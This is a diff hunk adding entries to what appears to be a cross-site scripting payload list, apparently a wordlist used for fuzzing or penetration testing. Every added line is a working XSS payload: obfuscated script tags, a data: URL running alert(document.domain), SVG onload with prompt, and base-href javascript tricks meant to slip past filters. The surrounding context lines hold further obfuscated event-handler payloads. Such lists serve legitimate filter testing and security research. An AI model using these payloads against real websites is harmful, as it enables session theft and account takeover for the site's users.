@@ -1156,4 +1156,11 @@ with(document)body.appendChild(createElement('iframe onload=&#97&#108&#101&#114&
 <input type="search" onsearch="aler\u0074(1)">
 <details ontoggle="aler\u0074(1)">
 <script>class a{@alert get}</script>
+<script>Reflect.construct(function(){new.target.constructor('alert(1)')()},[])</script>
+<script>1\u0069\u006E[];</script>
+data:text/html,<script>alert(document.domain)</script>
+<svg><script>prompt&#40;1)<b>
+<base href="javascript:\"> <a href="//%0aalert(5);//">
+<svg/onload=prompt&#40;1)
+<base href="javascript:/"><a href="**/alert(1)">
 /* RFI STOP */
